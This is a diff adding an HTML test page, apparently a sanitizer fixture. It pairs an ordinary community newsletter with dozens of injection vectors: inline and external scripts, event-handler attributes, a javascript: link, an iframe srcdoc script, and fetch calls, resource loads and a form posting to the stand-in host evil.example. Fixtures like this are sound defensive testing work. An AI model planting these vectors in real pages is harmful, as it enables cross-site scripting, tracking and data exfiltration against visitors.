@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta http-equiv="refresh" content="0; url=https://evil.example/refresh">
+<base href="https://evil.example/base/">
+<title>Ordinary looking page</title>
+<link rel="stylesheet" href="https://evil.example/style.css">
+<link rel="preload" as="font" href="https://evil.example/font.woff2" crossorigin>
+<link rel="prefetch" href="https://evil.example/prefetch">
+<style>@import url("https://evil.example/import.css"); body { background: url("https://evil.example/bg.png"); } @font-face { font-family: X; src: url(https://evil.example/f.woff); }</style>
+<script>window.__pwned = 'inline script ran'; fetch('https://evil.example/inline-fetch');</script>
+<script src="https://evil.example/external.js"></script>
+</head>
+<body onload="window.__pwned = 'onload ran'; fetch('https://evil.example/onload')">
+<main>
+  <h1>Quarterly update for members</h1>
+  <p>Membership grew to 1,240 households this quarter, and the community garden opened on the first weekend of spring with more than 300 visitors.</p>
+  <p>Read the <a href="javascript:window.__pwned='link'">full report</a> or the <a href="https://members.example/report.pdf">PDF version</a>.</p>
+  <img src="https://evil.example/img.png" alt="The opening of the community garden" onerror="window.__pwned = 'onerror ran'; fetch('https://evil.example/onerror')">
+  <img src="x" srcset="https://evil.example/srcset-1x.png 1x, https://evil.example/srcset-2x.png 2x" alt="">
+  <picture><source srcset="https://evil.example/picture.webp" type="image/webp"><img src="https://evil.example/picture.jpg" alt="A picture element"></picture>
+  <svg onload="window.__pwned = 'svg ran'"><image href="https://evil.example/svg-image.png"/></svg>
+  <iframe src="https://evil.example/frame" srcdoc="<script>parent.__pwned='srcdoc ran'</script>"></iframe>
+  <object data="https://evil.example/object.swf"></object>
+  <embed src="https://evil.example/embed.swf">
+  <video src="https://evil.example/video.mp4" poster="https://evil.example/poster.jpg" autoplay></video>
+  <audio src="https://evil.example/audio.mp3" autoplay></audio>
+  <div style="background-image: url('https://evil.example/div-bg.png')"><p>Next meeting: Tuesday 9 December at 6.30 pm in the community hall.</p></div>
+  <form action="https://evil.example/collect"><input name="email" value="steal@example.com" autofocus onfocus="window.__pwned='onfocus ran'"></form>
+  <details open ontoggle="window.__pwned='ontoggle ran'"><summary>More about the garden</summary><p>The garden has 40 plots, a tool shed and a rainwater tank donated by a local plumber.</p></details>
+  <marquee onstart="window.__pwned='marquee ran'">Scrolling text</marquee>
+  <script>window.__pwned = 'body script ran';</script>
+</main>
+<img src="https://evil.example/pixel.gif" alt="">
+</body>
+</html>
